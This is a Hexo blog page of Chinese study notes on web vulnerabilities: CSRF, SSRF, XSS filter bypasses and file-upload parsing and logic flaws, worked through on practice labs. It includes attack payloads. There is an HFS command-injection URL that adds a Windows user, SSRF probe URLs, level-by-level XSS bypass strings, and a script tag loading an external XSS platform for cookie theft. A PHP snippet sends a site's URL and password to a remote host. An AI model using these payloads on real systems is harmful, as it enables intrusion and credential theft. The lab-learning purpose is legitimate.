        <h4 id="CSRF漏洞解释，原理"><a href="#CSRF漏洞解释，原理" class="headerlink" title="CSRF漏洞解释，原理"></a>CSRF漏洞解释，原理</h4><p>CSRF（Cross-site request forgery）跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。</p>
<p>原理：</p>
<p>CSRF攻击攻击原理及过程如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 用户打开浏览器，访问受信任银行网站，输入用户名和密码请求登录网站；</span><br><span class="line"><span class="number">2.</span>在用户信息通过验证后，银行网站产生Cookie信息并返回给浏览器，此时用户登录网站成功，可以正常发送请求到网站；</span><br><span class="line"><span class="number">3.</span> 用户未退出银行网站之前，在同一浏览器中，打开一个TAB页访问其他网站B</span><br><span class="line"><span class="number">4.</span> 这时候网站B 已被黑客注入诱导信息，加入是一张图片,图片地址指向</span><br><span class="line">  src=”http:<span class="comment">//bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=黑客</span></span><br><span class="line">  点击之后转账给黑客这个账户</span><br><span class="line"><span class="number">5.</span> 浏览器在接收到这些攻击性代码请求后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，根据用户的Cookie信息以C的权限处理该请求，导致来自黑客请求恶意代码被执行。 </span><br></pre></td></tr></table></figure>

<p>这是原理, 攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ffb99fc70646">https://www.jianshu.com/p/ffb99fc70646</a></p>
<h4 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h4><p>1、当用户发送重要的请求时需要输入原始密码<br>2、设置随机Token<br>3、检验 referer 来源，请求时判断请求链接是否为当前管理员正在使用的页面（管理员在编辑文章，黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败）<br>4、设置验证码<br>5、限制请求方式只能为 POST</p>
<h5 id="随机token"><a href="#随机token" class="headerlink" title="随机token"></a>随机token</h5><p>Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。</p>
<h4 id="SSRF漏洞解释，原理"><a href="#SSRF漏洞解释，原理" class="headerlink" title="SSRF漏洞解释，原理"></a>SSRF漏洞解释，原理</h4><p>参考：<a target="_blank" rel="noopener" href="https://www.t00ls.net/articles-41070.html">https://www.t00ls.net/articles-41070.html</a></p>
<p>SSRF(Server-Side Request Forgery 服务器请求伪造)<br>目标：从外网无法访问的内部系统<br>形成原因：服务端提供了从其他服务器获取信息的功能，但没有对内网目标地址做过滤与限制<br>挖掘：从web功能上寻找   参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/kuiguowei/article/details/79070999">https://blog.csdn.net/kuiguowei/article/details/79070999</a><br>    1)分享:通过URL地址分享网页内容<br>    2)转码服务: 通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览   <a target="_blank" rel="noopener" href="http://101.201.64.215:8088/">http://101.201.64.215:8088/</a><br>    3)在线翻译:通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等<br>    4)图片加载与下载: 通过URL地址加载或下载图片<br>    5)图片、文章收藏功能<br>    6)未公开的api实现以及其他调用URL的功能</p>
<p>私有地址：<br>10.0.0.0 - 10.255.255.255<br>172.16.0.0 - 172.31.255.255<br>192.168.0.0 - 192.168.255.255</p>
<h5 id="上传图片、视频方式"><a href="#上传图片、视频方式" class="headerlink" title="上传图片、视频方式"></a>上传图片、视频方式</h5><p>1、本地上传<br>2、远程上传</p>
<h5 id="利用各种协议进行探针："><a href="#利用各种协议进行探针：" class="headerlink" title="利用各种协议进行探针："></a>利用各种协议进行探针：</h5><p><a target="_blank" rel="noopener" href="http://192.168.80.134/phpmyadmin/">http://192.168.80.134/phpmyadmin/</a><br>file://C:/<a target="_blank" rel="noopener" href="http://www.txt/">www.txt</a><br>dict://192.168.80.134:3306/info<br><a href="ftp://192.168.80.134/">ftp://192.168.80.134:21</a></p>
<h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>​    Pikachu-CSRF实验<br>​    Pikachu-CSRF防御-token测试<br>​    SSRF漏洞本地靶场演示_HttpFileServer应用测试<br>​    参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30527323/article/details/94862967">https://blog.csdn.net/weixin_30527323/article/details/94862967</a><br>​    <a target="_blank" rel="noopener" href="http://192.168.80.134:8080/?search==%00%7B.exec%7Ccmd.exe">http://192.168.80.134:8080/?search==%00{.exec|cmd.exe</a> /c net user test1234 1234 /add.}</p>
<h4 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h4><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ffb99fc70646">https://www.jianshu.com/p/ffb99fc70646</a>   CSRF漏洞原理<br><a target="_blank" rel="noopener" href="https://www.t00ls.net/articles-41070.html">https://www.t00ls.net/articles-41070.html</a>    SSRF漏洞</p>
<p>本地测试代码：</p>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<form action="" method="POST">
请输入图片地址：<input type='text' name='url'>
<input type='submit' value="提交">
</form>
<?php
$_POST['url'];
$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $_POST['url']);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_exec($ch);
curl_close($ch);
?>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/11/01/CSRF%E5%92%8CSSRF%E6%BC%8F%E6%B4%9E/" data-id="ckwgaav4s0000govjcc9cappn" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-xss漏洞-过滤绕过及工具使用" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/10/29/xss%E6%BC%8F%E6%B4%9E-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%8F%8A%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" class="article-date">
  <time datetime="2021-10-29T06:55:11.000Z" itemprop="datePublished">2021-10-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/10/29/xss%E6%BC%8F%E6%B4%9E-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%8F%8A%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">xss漏洞-过滤绕过及工具使用</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="简单介绍Beef工具"><a href="#简单介绍Beef工具" class="headerlink" title="简单介绍Beef工具"></a>简单介绍Beef工具</h4><p>Broser：主要是针对浏览器的一些信息收集或攻击，其下的子选项卡Hooked Domain主要是获取HTTP属性值，比如cookie、表单值等，还可以做写简单的浏览器操作，比如替换href值，弹出警告框，重定向浏览器等。这个选项卡下的有些模块会根据受害者的浏览器来决定是否显示。主要是浏览器通用操作和其他基本信息检测。<br>Chrome extensions：主要是针对谷歌浏览器扩展插件<br>Debug：调试功能<br>Exploits：漏洞利用，主要利用一些已公开的漏洞进行攻击测试<br>Host：针对主机，比如检测主机的浏览器、系统信息、IP地址、安装软件等等<br>IPEC：协议间通信。主要是用来连接、控制受害者浏览器的<br>Metasploit：Beef可通过配置和metasploit平台联合，一旦有受害者出现，可通过信息收集确定是否存在漏洞，进一步方便metasploit攻击测试<br>Misc：杂项。<br>Network：网络扫描<br>Persistence：维护受害者访问<br>Phonegap：手机测试<br>Social engineering：社会工程学攻击</p>
<p>其中：<br>绿色模块：可以执行且目标不可见<br>红色模块：不适合当前目标<br>橙色模块：可以执行但目标可见<br>灰色模块：未在目标浏览器上测试过</p>
<p>配置文件：/usr/share/beef-xss/config.yaml<br>  Get Cookie、Redirect Browser(跳转)、Fake Flash Update(图片伪造下载)</p>
<p><a target="_blank" rel="noopener" href="https://www.wangan.com/docs/815">https://www.wangan.com/docs/815</a>  beef模块说明</p>
<h4 id="HttpOnly-属性过滤防读取"><a href="#HttpOnly-属性过滤防读取" class="headerlink" title="HttpOnly 属性过滤防读取"></a>HttpOnly 属性过滤防读取</h4><p>如果cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击</p>
<h4 id="登录后台的方式"><a href="#登录后台的方式" class="headerlink" title="登录后台的方式"></a>登录后台的方式</h4><p>1、直接登录<br>2、采用cookie登录</p>
<h4 id="绕过-httponly："><a href="#绕过-httponly：" class="headerlink" title="绕过 httponly："></a>绕过 httponly：</h4><p>1、浏览器保存帐号密码：浏览器读取帐号密码<br>2、浏览器未保存帐号密码：利用表单劫持</p>
<p>参考：<a target="_blank" rel="noopener" href="https://woj.app/1684.html">https://woj.app/1684.html</a></p>
<h4 id="代码类过滤：xsslabs"><a href="#代码类过滤：xsslabs" class="headerlink" title="代码类过滤：xsslabs"></a>代码类过滤：xsslabs</h4><script>alert(1)</script>
<p>onclick=”alert(1)”<br><a href="javascript:alert(1)"></p>
<p>less-2：”&gt;<script>alert(1)</script><br>less-3：’ onclick=’alert(1)<br>less-4：”onclick=”alert(1)”<br>less-5：”&gt;<a href="javascript:alert(1)"><br>less-6：”&gt;<a hRef="javascript:alert(1)"><br>less-7：” oonnclick=”alert(1)”<br>less-8：&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;<br>less-9：&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;//http://<br>less-10：?keyword=111&amp;t_sort=” onclick=”alert(1)”  将type改成text<br>less-11：?keyword=good job!&amp;t_sort=” onclick=”alert(1)” 将type改成text</p>
<h4 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h4><p><a target="_blank" rel="noopener" href="https://github.com/do0dl3/xss-labs">https://github.com/do0dl3/xss-labs</a><br><a target="_blank" rel="noopener" href="https://www.wangan.com/docs/815">https://www.wangan.com/docs/815</a>    beef模块说明</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/10/29/xss%E6%BC%8F%E6%B4%9E-%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%8F%8A%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" data-id="ckwgaav5l000sgovj5l815ax4" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-xss漏洞-基础分类及利用" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/10/26/xss%E6%BC%8F%E6%B4%9E-%E5%9F%BA%E7%A1%80%E5%88%86%E7%B1%BB%E5%8F%8A%E5%88%A9%E7%94%A8/" class="article-date">
  <time datetime="2021-10-26T06:52:38.000Z" itemprop="datePublished">2021-10-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/10/26/xss%E6%BC%8F%E6%B4%9E-%E5%9F%BA%E7%A1%80%E5%88%86%E7%B1%BB%E5%8F%8A%E5%88%A9%E7%94%A8/">xss漏洞-基础分类及利用</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="XSS跨站漏洞常识"><a href="#XSS跨站漏洞常识" class="headerlink" title="XSS跨站漏洞常识"></a>XSS跨站漏洞常识</h4><p>本质：产生在浏览器前端js代码的漏洞<br>危害：js脚本能干嘛，他就能干嘛，一句话。前端页面能做的事它都能做。(不仅仅盗取cookie、修改页面等)<br>函数类型：都是输出型的函数(echo，print等等)<br>浏览器内核版本：自带浏览器禁用js</p>
<h4 id="XSS跨站漏洞分类"><a href="#XSS跨站漏洞分类" class="headerlink" title="XSS跨站漏洞分类"></a>XSS跨站漏洞分类</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1、反射(非持续型)</span><br><span class="line">    跨站代码 -&gt;x.php-&gt;弹窗回显</span><br><span class="line">2、存储(持续型)</span><br><span class="line">    跨站代码 -&gt;x.php-&gt;与数据库进行交互-&gt;x.php-&gt;弹窗回显</span><br><span class="line">3、DOM-反射型XSS的一种</span><br><span class="line">    跨站代码 -&gt;x.php-&gt;本地浏览器静态前端代码-&gt;x.php-&gt;弹窗回显</span><br><span class="line"></span><br><span class="line">&lt;a href&#x3D;&#39;&#39;onclick&#x3D;&quot;alert(1)&quot;&#39;&gt;what do you see?&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>



<h5 id="DOM-究竟是什么？"><a href="#DOM-究竟是什么？" class="headerlink" title="DOM 究竟是什么？"></a>DOM 究竟是什么？</h5><p>文档对象模型（DOM）是 HTML 属性的一个特性。由于你的浏览器不理解 HTML，因此它会使用将 HTML 转换为 DOM 模型的解释器。<br>输出地点不同而导致结果不一致</p>
<h4 id="Cookie与Session"><a href="#Cookie与Session" class="headerlink" title="Cookie与Session"></a>Cookie与Session</h4><p>判断用户信息的凭据<br>Cookie  存储在本地  持续时间长   安全性较低  小型企业   盗取cookie<br>Session  会话 存储在服务器  持续时间较短   安全性较高  适用于中大型企业   会话劫持-网络监听，中间人攻击</p>
<h5 id="盗取cookie的前提条件"><a href="#盗取cookie的前提条件" class="headerlink" title="盗取cookie的前提条件"></a>盗取cookie的前提条件</h5><p>1、对方存在xss漏洞<br>2、对方管理员有保存账号密码<br>3、浏览器内核允许执行js脚本</p>
<h4 id="XSS-常规攻击手法"><a href="#XSS-常规攻击手法" class="headerlink" title="XSS 常规攻击手法"></a>XSS 常规攻击手法</h4><p>1、xss平台    <a target="_blank" rel="noopener" href="https://xss8.cc/">https://xss8.cc/</a><br>    <sCRiPt sRC=//xss8.cc/ExO5></sCrIpT><br>2、工具<br>3、结合其他漏洞  CSRF跨站请求伪造</p>
<h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>营销订单系统jfdd<br>Postman工具的简单使用<br>WebShell 箱子系统<br>    win7 –渗透者   win2008–服务器   本机—箱子管理员</p>
<?php
$password="admin";
$url=$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
echo "<script src='http://192.168.80.1/api.asp?url=$url&pass=$password'>";
?>
<p>$_SERVER[‘PHP_SELF’] #当前正在执行脚本的文件名，与 document root相关。<br>$_SERVER[‘HTTP_HOST’] #当前请求的 Host: 头部的内容</p>
<h4 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h4><p><a target="_blank" rel="noopener" href="https://xsshs.cn/xss.php?do=login">https://xsshs.cn/xss.php?do=login</a>   XSS平台<br><a target="_blank" rel="noopener" href="https://github.com/do0dl3/xss-labs">https://github.com/do0dl3/xss-labs</a>   XSS靶场<br><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1ZadZUPSFXqwB8eRG1gDZOw">https://pan.baidu.com/s/1ZadZUPSFXqwB8eRG1gDZOw</a>  提取码：5qm1  营销系统jfdd<br><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1I4LzRmBGH8qjGR6bwONvcw">https://pan.baidu.com/s/1I4LzRmBGH8qjGR6bwONvcw</a>     提取码：t8rj   Shell箱子系统<br><a target="_blank" rel="noopener" href="https://www.postman.com/downloads/">https://www.postman.com/downloads/</a>     Postman工具下载</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/10/26/xss%E6%BC%8F%E6%B4%9E-%E5%9F%BA%E7%A1%80%E5%88%86%E7%B1%BB%E5%8F%8A%E5%88%A9%E7%94%A8/" data-id="ckwgaav5l000rgovj3jdz00bx" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-文件上传漏洞-解析漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2021-10-23T05:44:59.000Z" itemprop="datePublished">2021-10-23</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/">文件上传漏洞-解析漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="各个平台解析漏洞"><a href="#各个平台解析漏洞" class="headerlink" title="各个平台解析漏洞"></a>各个平台解析漏洞</h3><p>​     IIS,Apache,Nginx</p>
<h4 id="IIS6-0有2种解析漏洞"><a href="#IIS6-0有2种解析漏洞" class="headerlink" title="IIS6.0有2种解析漏洞"></a>IIS6.0有2种解析漏洞</h4><p>前提：开启Active Server Pages服务拓展(一般情况下都是开启的)<br>1、目录解析<br>以*.asp命名的文件夹里的文件都将会被当成ASP文件执行。<br>2、文件解析<br>*.asp;.jpg 像这种畸形文件名在“;”后面的直接被忽略，也就是说当成 *.asp文件执行。</p>
<h4 id="IIS7-5解析漏洞"><a href="#IIS7-5解析漏洞" class="headerlink" title="IIS7.5解析漏洞"></a>IIS7.5解析漏洞</h4><p>解析过程同Nginx解析漏洞复现</p>
<h4 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h4><p>   解析test.jpg/.php 以php解析运行<br>   文件名逻辑漏洞(CVE-2013-4547)</p>
<h4 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h4><p>1、多后缀名    test.php.ab.cd.ef   特点：apache从后到前识别，遇到无法识别的后缀进行往前看<br>2、罕见后缀    7z<br>3、.htaccess文件</p>
<h4 id="伪静态"><a href="#伪静态" class="headerlink" title="伪静态"></a>伪静态</h4><p><a target="_blank" rel="noopener" href="http://www.yucedu.com/1.html">www.yucedu.com/1.html</a>  静态<br><a target="_blank" rel="noopener" href="http://www.yucedu.com/?id=1">www.yucedu.com/?id=1</a>  动态<br><a target="_blank" rel="noopener" href="http://www.yucedu.com/1">www.yucedu.com/1</a>   伪静态，实质上是动态<br>三个显示的界面都是一样，只是url上表现不同</p>
<h4 id="各个WEB编辑器安全问题"><a href="#各个WEB编辑器安全问题" class="headerlink" title="各个WEB编辑器安全问题"></a>各个WEB编辑器安全问题</h4><p><a target="_blank" rel="noopener" href="https://navisec.it/%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%89%8B%E5%86%8C/">https://navisec.it/编辑器漏洞手册/</a></p>
<h4 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h4><p><a target="_blank" rel="noopener" href="https://navisec.it/%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%89%8B%E5%86%8C/">https://navisec.it/编辑器漏洞手册/</a><br><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1YbZ4nfaAzrlLZ7afU1LcBQ">https://pan.baidu.com/s/1YbZ4nfaAzrlLZ7afU1LcBQ</a>     提取码：p8cd  通达OA系统源码</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/10/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" data-id="ckwgaav5t0011govje86r9n0p" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-文件上传漏洞的上传逻辑安全" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/10/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E5%AE%89%E5%85%A8/" class="article-date">
  <time datetime="2021-10-20T07:15:32.000Z" itemprop="datePublished">2021-10-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/10/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E5%AE%89%E5%85%A8/">文件上传漏洞的上传逻辑安全</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h5 id="文件头检测"><a href="#文件头检测" class="headerlink" title="文件头检测"></a>文件头检测</h5><p>各个文件格式的二进制流<br>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/babycool/p/3531696.html">https://www.cnblogs.com/babycool/p/3531696.html</a></p>
<h5 id="图像文件信息判断"><a href="#图像文件信息判断" class="headerlink" title="图像文件信息判断"></a>图像文件信息判断</h5><p> Pass-15 getimagesize函数   Pass-16 exif_imagetype函数   Pass-17 imagecreatefromjpeg函数</p>
<h5 id="逻辑安全-二次渲染-https-www-58pic-com"><a href="#逻辑安全-二次渲染-https-www-58pic-com" class="headerlink" title="逻辑安全-二次渲染  https://www.58pic.com"></a>逻辑安全-二次渲染  <a target="_blank" rel="noopener" href="https://www.58pic.com/">https://www.58pic.com</a></h5><p>二次渲染就是根据用户上传的图片，新生成一个图片，将原始图片删除，将新图片添加到数据库中。比如一些网站根据用户上传的头像生成大中小不同尺寸的图像。</p>
<h5 id="逻辑安全-条件竞争-Pass-18"><a href="#逻辑安全-条件竞争-Pass-18" class="headerlink" title="逻辑安全-条件竞争 Pass-18"></a>逻辑安全-条件竞争 Pass-18</h5><p>条件竞争漏洞是一种服务器端的漏洞，是由于开发者设计应用程序并发处理时操作逻辑不合理而造成。当应用面临高并发的请求时未能同步好所有请求，导致请求与请求之间产生等待时出现逻辑缺陷</p>
<h5 id="目录命名绕过-Pass-20"><a href="#目录命名绕过-Pass-20" class="headerlink" title="目录命名绕过   Pass-20"></a>目录命名绕过   Pass-20</h5><h5 id="数组接受-目录命名-Pass-21"><a href="#数组接受-目录命名-Pass-21" class="headerlink" title="数组接受+目录命名   Pass-21"></a>数组接受+目录命名   Pass-21</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">upload-20.php</span><br><span class="line">upload-20   .    jpg</span><br><span class="line"></span><br><span class="line">save_name[0]&#x3D;upload-20</span><br><span class="line">save_name[1]&#x3D;.</span><br><span class="line">save_name[2]&#x3D;php</span><br><span class="line"></span><br><span class="line">upload-20.php&#x2F;.jpg</span><br><span class="line"></span><br><span class="line">1.php&#x2F;.jpg</span><br><span class="line"></span><br><span class="line">-----------------------------231102717837736124334110320076</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;save_name[0]&quot;</span><br><span class="line"></span><br><span class="line">upload-20.php&#x2F;</span><br><span class="line">-----------------------------231102717837736124334110320076</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;save_name[2]&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h4><p><a target="_blank" rel="noopener" href="https://www.smi1e.top/2018/06/16/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">https://www.smi1e.top/2018/06/16/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</a><br><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1cb4agMZonkfUkz_2R_-GxA">https://pan.baidu.com/s/1cb4agMZonkfUkz_2R_-GxA</a>  提取码：teb8   Web中间件常见漏洞总结.pdf</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/10/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E5%AE%89%E5%85%A8/" data-id="ckwgaav5u0012govj5jc37t80" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/11/26/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">PHP反序列化漏洞</a>
          </li>
        
          <li>
            <a href="/2021/11/21/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E5%92%8Ctoken%E5%AE%89%E5%85%A8%E5%8F%8A%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6/">逻辑越权漏洞-验证码和token安全及找回机制</a>
          </li>
        
          <li>
            <a href="/2021/11/16/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E2%80%94-%E5%90%84%E7%A7%8D%E8%B6%8A%E6%9D%83%E5%92%8C%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9/">逻辑越权漏洞—-各种越权和数据篡改</a>
          </li>
        
          <li>
            <a href="/2021/11/11/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/">文件操作之文件下载读取</a>
          </li>
        
          <li>
            <a href="/2021/11/04/RCE%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">RCE代码命令执行漏洞</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2021 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>